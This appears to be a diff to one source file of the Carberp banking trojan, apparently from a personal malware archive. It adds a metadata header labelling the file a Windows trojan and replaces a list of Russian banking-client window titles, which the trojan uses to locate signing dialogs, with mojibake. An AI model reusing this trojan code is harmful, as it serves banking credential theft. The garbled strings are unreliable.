@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "Inist.h"
 //#ifdef RuBnkH
 
@@ -9,7 +20,7 @@ PINISTTranslateMessage Real_INISTTranslateMessage;
 void GetInist()
 {
 
-	char *szInistTitles[] = { "Регистрация пользователя", "Подпись данных", "Подпись и шифрование", 0 };
+	char *szInistTitles[] = { "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", 0 };
 
 	HWND hInistForm = NULL;
 
